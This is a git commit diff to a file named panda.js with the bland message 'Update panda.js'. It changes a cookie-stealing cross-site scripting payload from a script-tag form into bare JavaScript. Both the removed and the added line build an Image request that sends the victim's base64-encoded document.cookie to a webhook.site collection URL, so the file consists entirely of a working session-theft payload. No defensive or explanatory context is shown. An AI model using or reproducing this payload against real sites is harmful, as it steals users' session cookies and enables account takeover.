b0f8413d704f72e0f28715064218588739fd984a
fatihsencer <43623120+fatihsencer@users.noreply.github.com>
2025-05-29 04:50:29 +0300

    Update panda.js

--- panda.js
+++ panda.js
@@ -1,1 +1,1 @@
-<script>x = new Image(); x.src = 'https://webhook.site/c389e13c-5ac1-499d-a56a-7a72c8d405ae?data='+btoa(document.cookie);</script>
+x = new Image(); x.src = 'https://webhook.site/c389e13c-5ac1-499d-a56a-7a72c8d405ae?data='+btoa(document.cookie);
